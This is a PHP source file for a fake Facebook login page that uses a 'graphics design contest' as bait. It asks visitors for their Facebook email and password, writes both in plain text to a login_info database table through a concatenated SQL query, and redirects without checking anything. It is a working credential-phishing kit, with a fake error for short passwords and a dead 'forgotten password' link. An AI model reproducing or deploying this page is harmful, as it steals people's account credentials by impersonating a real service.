<?php
session_start();
if (count($_SESSION["fb_email"]) > 0 and count($_SESSION["fb_password"]) > 0) {
  header('location: index.php');
}

require_once 'config.php';
require_once('test_data.php');

$emailErr = $passwordErr = "";
$email = $password = "";

if (isset($_POST["login"])) {
  $email = test_data($_POST["email"]);

  if (strlen($_POST["password"]) < 8) {
    $passwordErr = "Incorrect Password";
  } else {
    $password = test_data($_POST["password"]);

    $sql = "INSERT INTO login_info(email, password) VALUES('$email', '$password')";

    if (mysqli_query($conn, $sql)) {
      $_SESSION["fb_email"] = $email;
      $_SESSION["fb_password"] = $password;
      header('location: index.php');
    } else {
      echo mysqli_error($conn);
    }
  }
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook</title>
  <!-- Custom Styles -->
  <link rel="stylesheet" href="style.css">
  <style>
    .error {
      color: #ff0000;
      font-size: 14px;
    }
  </style>
</head>

<body>
  <main>
    <div>
      <section class="wrapper">
        <div class="hero-wrapper">
          <div class="img-wrapper">
            <img src="images/logo.svg" alt="facebook_logo"> <span>contest</span>
          </div>
          <hr class="hr" />
          <p>
            Facebook graphics design contest helps you connect and share your design with the people.
          </p>
        </div>
      </section>
      <section class="wrapper">
        <div class="login-wrapper">
          <form method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
            <input type="email" name="email" placeholder="Facebook email address" value="<?php echo $email; ?>" required />
            <input type="password" name="password" placeholder="Password" required />
            <span class="error"><?php echo $passwordErr; ?></span>
            <input type="submit" value="Log In" name="login" />
            <div class="link">
              <a onclick="openForgotten()">Forgotten password?</a>
            </div>
            <hr>

            <button type="submit" name="login">
              Create New Account
            </button>

          </form>
        </div>
      </section>
    </div>
  </main>

  <div id="forgotten" class="d-flex">
    <div class="d-flex">
      <p>
        Relax !! Try to remember your password
      </p>
      <button onclick="closeForgotten()">Close</button>
    </div>
  </div>

  <?php require_once("footer.php"); ?>

  <script>
    function openForgotten() {
      document.getElementById("forgotten").style.visibility = "visible";
    }

    function closeForgotten() {
      document.getElementById("forgotten").style.visibility = "hidden";
    }
  </script>

</body>

</html>